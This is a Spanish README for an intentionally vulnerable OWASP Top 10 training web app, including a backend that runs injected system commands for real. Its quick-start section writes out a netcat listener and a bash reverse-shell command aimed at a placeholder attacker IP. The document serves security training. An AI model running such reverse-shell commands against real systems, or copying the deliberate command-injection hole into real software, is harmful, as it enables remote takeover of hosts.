<div align="center">
<img width="800" height="400" alt="OWASP Top 10 Vulnerable Web App" src="https://raw.githubusercontent.com/Kayzzii/aplicaci-n-web-vulnerable-owasp-top-10/main/Top10_Logo.png" />
</div>

# 🛡️ Aplicación Web Vulnerable - OWASP Top 10

Esta es una aplicación educativa que simula las 10 vulnerabilidades más críticas de seguridad web según OWASP Top 10 2021.

## ⚠️ ADVERTENCIA IMPORTANTE
Esta aplicación contiene vulnerabilidades intencionales para fines educativos. **NO usar en producción**.

## 🚨 NUEVA CARACTERÍSTICA: Command Injection Real
Ahora incluye un servidor backend que ejecuta comandos reales del sistema para reverse shells auténticas.

## 📁 Estructura del proyecto

```
├── components/          # Componentes React
│   ├── Header.tsx
│   ├── Sidebar.tsx
│   └── Welcome.tsx
├── pages/              # Páginas de vulnerabilidades
│   ├── A01_BrokenAccessControl.tsx
│   ├── A02_CryptographicFailures.tsx
│   ├── A03_Injection.tsx
│   ├── A04_InsecureDesign.tsx
│   ├── A05_SecurityMisconfiguration.tsx
│   ├── A06_VulnerableComponents.tsx
│   ├── A07_IdentificationAndAuthenticationFailures.tsx
│   ├── A08_SoftwareAndDataIntegrityFailures.tsx
│   ├── A09_SecurityLoggingAndMonitoringFailures.tsx
│   ├── A10_ServerSideRequestForgery.tsx
│   └── CommandInjection.tsx    # 💀 NUEVA: Command Injection real
├── server.js           # 🚨 Servidor backend vulnerable
├── App.tsx
├── index.tsx
└── package.json
```

## 🚀 Cómo ejecutar

### Solo Frontend (Simulación):
```bash
npm install
npm run dev
```

### 💀 Backend Vulnerable (Ejecución Real):
```bash
npm install
npm run build
npm run server
# Aplicación disponible en http://localhost:3001
```

## 🎯 Vulnerabilidades Incluidas

### ✅ OWASP Top 10 2021:
1. **A01** - Control de Acceso Roto
2. **A02** - Fallos Criptográficos  
3. **A03** - Inyección (XSS DOM real)
4. **A04** - Diseño Inseguro
5. **A05** - Configuración de Seguridad Incorrecta
6. **A06** - Componentes Vulnerables (con exploits)
7. **A07** - Fallas de Identificación y Autenticación
8. **A08** - Fallas de Integridad de Software
9. **A09** - Fallas de Registro y Monitoreo
10. **A10** - Server-Side Request Forgery (SSRF mejorado)

### 🆕 Vulnerabilidad Extra:
- **💀 Command Injection** - Ejecución real de comandos y reverse shells

## 🔥 Características Mejoradas

### A03 - XSS DOM:
- ✅ Ejecuta JavaScript real
- ✅ Payloads funcionales
- ✅ Ejemplos interactivos

### A06 - Componentes Vulnerables:
- ✅ Simula librería vulnerable real
- ✅ Exploits de ejemplo
- ✅ Tracking de payloads

### 💀 Command Injection:
- ✅ **Ejecución real de comandos**
- ✅ **Reverse shells auténticas**
- ✅ Conexión directa con Kali Linux
- ✅ Payloads de bash, netcat, python
- ✅ Simulación de fallback si no hay backend

### A10 - SSRF:
- ✅ Acceso a servicios internos
- ✅ Metadata de AWS simulado
- ✅ File inclusion
- ✅ Network scanning

## 🚨 Para Pentesting Real

Ver [DEPLOYMENT.md](DEPLOYMENT.md) para instrucciones completas de despliegue con backend vulnerable.

### Quick Start para Reverse Shell:
1. **Kali Linux:** `nc -lvnp 4444`
2. **Servidor:** `npm run server`
3. **Web:** Ir a "💀 Command Injection"
4. **Comando:** `bash -c 'bash -i >& /dev/tcp/TU_KALI_IP/4444 0>&1'`

## 🎓 Propósito Educativo

Esta aplicación está diseñada para:
- 🎓 Enseñar vulnerabilidades web
- 🔍 Practicar pentesting ético  
- 🛡️ Entender defensas de seguridad
- 💡 Demostrar el impacto real de las vulnerabilidades
- 🚨 Aprender técnicas de explotación

## 🔧 Instalación Local

**Prerequisitos:** Node.js (versión 16 o superior)

1. **Clonar el repositorio:**
   ```bash
   git clone https://github.com/Kayzzii/aplicaci-n-web-vulnerable-owasp-top-10.git
   cd aplicaci-n-web-vulnerable-owasp-top-10
   ```

2. **Instalar dependencias:**
   ```bash
   npm install
   ```

3. **Ejecutar la aplicación:**
   ```bash
   # Solo frontend (simulación)
   npm run dev
   
   # Con backend vulnerable (comandos reales)
   npm run server
   ```

## 🌟 Características Destacadas

- **Interfaz moderna** con React + TypeScript
- **Vulnerabilidades reales** no solo simuladas
- **Command Injection auténtico** con reverse shells
- **XSS que ejecuta JavaScript real**
- **SSRF con payloads realistas**
- **Documentación completa** de cada vulnerabilidad
- **Ejemplos prácticos** de explotación

## 📋 Lista de Verificación de Seguridad

Usa esta aplicación para aprender a identificar y prevenir:

- [ ] Broken Access Control
- [ ] Cryptographic Failures  
- [ ] Injection Attacks
- [ ] Insecure Design
- [ ] Security Misconfiguration
- [ ] Vulnerable Components
- [ ] Authentication Failures
- [ ] Software Integrity Failures
- [ ] Logging & Monitoring Failures
- [ ] Server-Side Request Forgery

## 🤝 Contribuciones

Las contribuciones son bienvenidas. Por favor:

1. Fork el repositorio
2. Crea una rama para tu feature
3. Commit tus cambios
4. Push a la rama
5. Abre un Pull Request

## 📝 Licencia

Este proyecto es para fines educativos únicamente.

## ⚠️ Disclaimer

Esta herramienta es solo para educación y testing ético. El autor no se hace responsable del uso indebido de esta aplicación.
